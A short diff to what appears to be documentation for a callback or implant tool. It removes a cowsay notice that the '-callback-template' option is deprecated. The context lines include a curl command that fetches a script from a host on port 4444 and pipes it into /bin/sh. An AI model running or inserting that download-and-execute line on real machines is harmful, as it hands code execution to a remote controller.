@@ -28,22 +28,6 @@ curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' '
 curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444/c' | /bin/sh
 ```
 
-`-callback-template`
---------------------
-```
- _______________________
-/ -callback-template is \
-| going away eventually |
-|                       |
-\ Use -callback instead /
- -----------------------
-        \   ^__^
-         \  (!!)\_______
-            (__)\       )\/\
-                ||----w |
-                ||     ||
-```
-
 `-ctrl-i`
 ---------
 Specifies a file or directory with a bunch of shell functions to send to
